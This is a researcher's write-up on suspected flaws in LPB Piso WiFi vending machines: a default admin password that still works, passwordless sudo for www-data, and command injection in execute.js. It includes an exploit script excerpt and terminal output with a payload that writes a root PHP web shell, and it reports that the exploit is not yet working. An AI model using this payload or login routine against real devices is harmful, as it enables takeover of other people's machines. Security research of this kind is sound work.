# ANOTHER VULNERABILITY - UNDER INVESTIGATION

While the Fail-Open is proven via blocking the communication between the client and server, it seems that there is another vulnerability in which it is still under investigation. There is a misconfiguration on where an attacker can send a payload to a Piso WiFi machine and let them execute the command without using SSH through means of RCE.

# About Default Admin Password
Although you change the password for admin, it seems that it's default password `123456789` is still valid, but cannot be used for admin webpage. Evidence of this shows on this output:

```
coltonsilva@silsysdebian:~/Documents/webshells$ python3 lpb_root_shell.py -t http://192.168.100.44/
[*] Targeting LPB Piso Wifi: http://192.168.100.44/
[*] Payload: 1; echo '<?php echo 'SHELL_ACTIVE'; system($_REQUEST['c']); ?>' | sudo tee /etc/bluetooth/bluetooth/root_shell.php; sudo chmod 777 /etc/bluetooth/bluetooth/root_shell.php;
[-] Logging in as admin...
[+] Login sent. Cookie: {'PHPSESSID': 'vpghl906oj5u1mst8p1tb11v85', 'cmac': '00%3A21%3A9b%3Ada%3A4f%3A63'}
[-] Sending 'runspeedtest' RCE payload...
```

where in the python script:
```python
    # Login (Stealthy Entry)
    print("[-] Logging in as admin...")
    try:
        # We use the default password found
        login_data = {'username': 'admin', 'pass': '123456789'}
        session.post(f"{base_url}/index.php", params={'exec': 'login'}, data=login_data, timeout=5)
        print(f"[+] Login sent. Cookie: {session.cookies.get_dict()}")
    except Exception as e:
        print(f"[-] Login failed: {e}")
        return
```

# Which Misconfiguration?
It is suspected that the `www-data` user is the weakest point (`www-data ALL=NOPASSWD: ALL`), allowing any web shell to escalate to root immediately.

# OK which of them is Vulnerable?
Code in execute.js (`runspeedtest`, `saveportalsettings`) is vulnerable to command injection via `exec()`.

# But why under investigation?
The entry point for the exploit seems problematic, where the web request `POST /index.php action=execute.js` is not reaching the `exec()` call with the injected variable in which initially I abandoned it. For now, I still looking for possible workaround for `execute.js` and finding other entry points.
